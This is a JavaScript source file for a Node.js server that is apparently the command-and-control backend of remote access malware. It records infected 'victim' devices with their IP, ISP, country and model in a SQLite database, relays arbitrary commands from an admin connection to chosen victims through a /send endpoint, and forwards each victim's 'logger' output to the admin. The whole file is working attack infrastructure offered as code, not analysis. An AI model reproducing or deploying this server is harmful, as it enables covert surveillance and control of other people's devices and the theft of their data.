import express  from "express";
import path from 'path'
import { Server } from "socket.io";
import bodyParser from 'body-parser';
import cors from 'cors'
import sqlite3 from "sqlite3";




// Variables
const port = 4000
const ip = "0.0.0.0"
// const ip = "192.168.29.130"
let ids = []
let adminSoc = ""
// Variables



// DATABASE
let db = new sqlite3.Database('./database/devicesDB', (err) => {
    if (err) {
      return console.error(err.message);
    }
    console.log('Connected to the in-memory SQlite database.');
  });
  

  // close the database connection
//   db.close((err) => {
//     if (err) {
//       return console.error(err.message);
//     }
//     console.log('Close the database connection.');
//   });



// Express
const app = express()
app.use(bodyParser.urlencoded({ extended: false }))
app.use(express.static('static'))
app.use(cors())

app.get("/dashboard",(req,res)=>{
    res.sendFile(path.resolve("./static/html/index.html"))
})

app.post("/send",(req,res)=>{
    
    if(req.body.emit == "ping"){
        ids.forEach(id=>{
            io.sockets.sockets.get(id).emit("ping",req.body.args)
        })
    }else{
        io.sockets.sockets.get(req.body.id).emit(req.body.emit,req.body.args)
    }
    res.status(200).send("Good")
})



const server = app.listen(port,ip, () => {
    console.log(`App listening on http://${ip}:${port}/`)
})    

// Socket io Connection
const io = new Server(server);
io.on("connection",(socket)=>{
    console.log(`connected : ${socket.id}\taddr : ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}\tuser : ${socket.handshake.query['user'] ? socket.handshake.query['user'] : "notAdmin"}`)
    if(socket.handshake.query['user'] == "admin"){
        adminSoc = socket
    }


    socket.on("disconnect",()=>{
        db.get(`delete from victim where id = ?`,[socket.id],(err)=>{
            if (err) {
                return console.error(err.message);
            }
            // console.log("Deleted")
        })
        console.log("disconnected : "+socket.id)
        if(socket.id != adminSoc.id){
            getRemaining()
        }
    })
    // socket.on("msg",(...data)=>{
        // console.log(data);
        // adminSoc.emit("admin",data)
    // })
    socket.on("logger",(data)=>{
        // console.log("logger: "+data)
        adminSoc.emit("logger",data)
    })
    socket.on("info",(strData)=>{
        // console.log("info: "+data)
        var data = JSON.parse(strData)
        db.get(`insert into victim(ID,Country,ISP,IP,Brand,Model,Manufacture) values(?,?,?,?,?,?,?)`,[socket.id,data.Country,data.ISP,data.IP,data.Brand,data.Model,data.Manufacture],(err)=>{
            if (err) {
                return console.error(err.message);
            }
            // console.log("Inserted")
        })
        getRemaining()
        // adminSoc.emit("info",socket.id,data);
    })
})



function getRemaining() {
    var data = []
    db.each(`select ID,Brand,Model from victim limit 20`,[],(err,row)=>{
        if (err) {
            return console.error(err.message);
        }
        data.push([row.ID,row.Brand,row.Model])
    },()=>{
        // console.log(data) 
        adminSoc.emit("info",data);
    })
}

